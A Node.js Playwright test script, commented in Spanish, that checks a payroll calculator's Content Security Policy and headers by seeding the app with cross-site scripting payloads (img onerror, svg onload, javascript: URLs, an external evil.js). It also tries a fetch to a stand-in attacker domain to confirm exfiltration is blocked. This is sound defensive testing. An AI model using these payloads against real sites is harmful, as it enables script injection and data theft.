// Ataques simulados en navegador real con las cabeceras de netlify.toml aplicadas (incluida la CSP).
// Uso: node tests/seguridad-navegador.js
const http = require('http'), fs = require('fs'), path = require('path');
const { chromium, devices } = require('playwright');
const ROOT = path.resolve(__dirname, '..');
const toml = fs.readFileSync(path.join(ROOT, 'netlify.toml'), 'utf8');
const csp = (toml.match(/Content-Security-Policy = "([^"]+)"/) || [])[1];
const demo = fs.readFileSync(path.join(ROOT, 'calculadora.html'), 'utf8').replace(/window\.LIQUIDA_LIC=\{.*?\};?\n/, 'window.LIQUIDA_LIC={};\n');
let fail = 0, n = 0;
const ok = (name, c, extra) => { n++; if (!c) fail++; console.log((c ? 'ok   ' : 'FAIL ') + name + (c ? '' : '  ' + (extra || ''))); };
ok('netlify.toml define una CSP', !!csp);
ok('CSP: sin objetos, sin base externa, sin marcos de terceros', /object-src 'none'/.test(csp) && /base-uri 'self'/.test(csp) && /frame-ancestors 'self'/.test(csp));
ok('CSP: conexiones solo a Supabase y Formspree', /connect-src 'self' https:\/\/\*\.supabase\.co https:\/\/formspree\.io/.test(csp));
ok('Cabeceras: nosniff, Referrer-Policy, X-Frame-Options', /X-Content-Type-Options = "nosniff"/.test(toml) && /Referrer-Policy/.test(toml) && /X-Frame-Options = "SAMEORIGIN"/.test(toml));
ok('Repositorio interno no publicado (supabase, docs, README, netlify.toml)', ['/supabase/*', '/docs/*', '/README.md', '/netlify.toml'].every(r => toml.includes('from = "' + r + '"')));

const srv = http.createServer((q, r) => {
  const u = decodeURIComponent(q.url.split('?')[0]);
  const h = { 'content-type': 'text/html; charset=utf-8', 'Content-Security-Policy': csp, 'X-Content-Type-Options': 'nosniff' };
  if (u === '/calc.html') { r.writeHead(200, h); return r.end(demo); }
  if (u === '/evil.js') { r.writeHead(200, { 'content-type': 'text/javascript', 'Access-Control-Allow-Origin': '*' }); return r.end('window.pwned="externo"'); }
  r.writeHead(404); r.end();
});
const XSS = ['<img src=x onerror="window.pwned=1">', '"><svg onload="window.pwned=2">', "'-window.pwned=3-'", '<script>window.pwned=4</script>', 'javascript:window.pwned=5', '</textarea><script src="/evil.js"></script>'];
const hostil = {
  premium: true, lic: '<img src=x onerror="window.pwned=6">',
  workers: XSS.map((x, i) => ({ id: 'w' + i, name: x, dni: x, sueldo: 3000, asig: false, reg: 'general', pension: 'afp', afp: 'integra', comision: 'flujo' }))
    .concat([{ id: '"><img src=x onerror="window.pwned=7">', name: 'malo' }]),
  f: { sueldo: '<img src=x onerror="window.pwned=8">', reg: '"><svg onload="window.pwned=9">', ingreso: '<b>' }, calc: '<img src=x onerror="window.pwned=10">',
  nov: { '2026-11': { w0: { bonos: '<img src=x onerror="window.pwned=11">' } } }, empresa: { name: XSS[0], ruc: XSS[1] }
};
const sb = { access_token: '<img src=x onerror="window.pwned=12">', refresh_token: 'x', uid: '"><svg onload="window.pwned=13">', email: XSS[0], exp: 9999999999 };
const firmas = { 'w0|2026-11': 'data:image/png;base64,"onerror="window.pwned=14', 'w1|2026-11': 'javascript:window.pwned=15' };

srv.listen(0, '127.0.0.1', async () => {
  const base = 'http://127.0.0.1:' + srv.address().port;
  const br = await chromium.launch();
  const ctx = await br.newContext({ ...devices['Pixel 7'] });
  let dialog = null;
  await ctx.addInitScript(([h, s, f]) => {
    if (!sessionStorage.getItem('sembrado')) { localStorage.setItem('liquida.v1', h); localStorage.setItem('liquida.sb.v1', s); localStorage.setItem('liquida.firmas.v1', f); sessionStorage.setItem('sembrado', '1'); }
  }, [JSON.stringify(hostil), JSON.stringify(sb), JSON.stringify(firmas)]);
  const page = await ctx.newPage(); page.setDefaultTimeout(4000);
  page.on('dialog', d => { dialog = d.message(); d.dismiss(); });
  const errs = []; page.on('pageerror', e => errs.push(e.message));
  const pwned = () => page.evaluate(() => window.pwned);

  await page.goto(base + '/calc.html#calc=%3Cimg%20src=x%20onerror=window.pwned=20%3E&sueldo=%22%3E%3Csvg%20onload=window.pwned=21%3E&reg=%3Cb%3E');
  await page.waitForSelector('#app button');
  ok('Datos guardados hostiles: la página sigue funcionando', await page.locator('#app button').count() > 5, errs[0]);
  for (const t of ['team', 'plan', 'guide', 'calc']) { await page.tap('[data-act="tab"][data-v="' + t + '"]').catch(() => {}); }
  ok('Equipo/planilla con nombres maliciosos: ningún script se ejecuta', (await pwned()) === undefined, 'window.pwned=' + await pwned());
  const bol = await page.$('[data-act="boleta"]'); if (bol) { await page.tap('[data-act="tab"][data-v="plan"]'); await page.tap('[data-act="boleta"]').catch(() => {}); await page.waitForTimeout(300); }
  ok('Boleta con datos maliciosos: ningún script se ejecuta', (await pwned()) === undefined, 'window.pwned=' + await pwned());
  await page.tap('[data-act="cuenta"]').catch(() => {}); await page.waitForTimeout(300);
  ok('Hoja de cuenta con sesión guardada maliciosa: ningún script se ejecuta', (await pwned()) === undefined, 'window.pwned=' + await pwned());
  ok('Ningún alert/confirm/prompt apareció', dialog === null, dialog);
  const html = await page.evaluate(() => document.documentElement.outerHTML);
  ok('El DOM no contiene elementos inyectados (img onerror / svg onload)', !/<img[^>]+onerror=/i.test(html) && !/<svg[^>]+onload=/i.test(html));
  ok('La firma manipulada no llega a un atributo src', !/src="data:image\/png;base64,"onerror/.test(html) && !/src="javascript:/i.test(html));

  // CSP activa: un script externo inyectado en caliente debe bloquearse
  const viol = []; page.on('console', m => { if (/Content Security Policy/i.test(m.text())) viol.push(m.text()); });
  await page.evaluate(() => { const s = document.createElement('script'); s.src = location.origin.replace('127.0.0.1', 'localhost') + '/evil.js'; document.body.appendChild(s); });
  await page.waitForTimeout(500);
  const cargado = await page.evaluate(() => window.pwned === 'externo');
  ok('CSP: un script de otro origen inyectado en caliente no se ejecuta', !cargado);
  const fetchBloq = await page.evaluate(() => fetch('https://ejemplo-atacante.com/x').then(() => 'pasó', () => 'bloqueado'));
  ok('CSP: no se puede enviar datos a un dominio ajeno (fetch)', fetchBloq === 'bloqueado', fetchBloq);

  // Cierre de sesión borra lo sensible (flujo "borrar datos de este equipo" probado en test_sb); aquí: nada sensible en texto plano
  const claves = await page.evaluate(() => Object.keys(localStorage));
  ok('localStorage solo guarda claves conocidas de Liquida', claves.every(k => /^liquida\./.test(k) || k === 'sembrado'), claves.join(','));
  const todo = await page.evaluate(() => JSON.stringify(localStorage));
  ok('No hay claves secretas (service_role / sb_secret / contraseña) guardadas', !/service_role|sb_secret_|password/i.test(todo));
  await br.close(); srv.close();
  console.log('\n' + (n - fail) + '/' + n + ' comprobaciones correctas'); process.exit(fail ? 1 : 0);
});
